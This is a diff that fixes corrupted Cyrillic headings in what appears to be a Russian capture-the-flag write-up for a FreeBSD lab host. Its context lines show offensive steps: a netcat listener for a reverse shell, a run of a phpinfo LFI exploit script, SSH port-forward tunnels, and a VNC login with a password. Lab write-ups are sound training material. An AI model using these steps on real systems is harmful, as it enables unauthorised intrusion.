@@ -73,7 +73,7 @@ OS: FreeBSD 11.x.
 http://10.129.1.254/
 ```
 
-�-аголовок: "Temporary website to test local .php scripts."
+Заголовок: "Temporary website to test local .php scripts."
 
 | URL           | Назначение                                             |
 |---------------|--------------------------------------------------------|
@@ -107,7 +107,7 @@ Listener:
 nc -lnvp 9001
 ```
 
-�-апуск:
+Запуск:
 
 ```bash
 python3 phpinfolfi_modifyed.py 10.129.1.254 80 100
@@ -191,7 +191,7 @@ netstat -an | grep LIST
 socks5  127.0.0.1 1080
 ```
 
-�-апуск:
+Запуск:
 
 ```bash
 ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
@@ -209,7 +209,7 @@ vncviewer -passwd secret 127.0.0.1::6901
 
 ## Flags
 
-| Флаг | �-начение                         |
+| Флаг | Значение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | (см. `/root/root.txt` через VNC) |
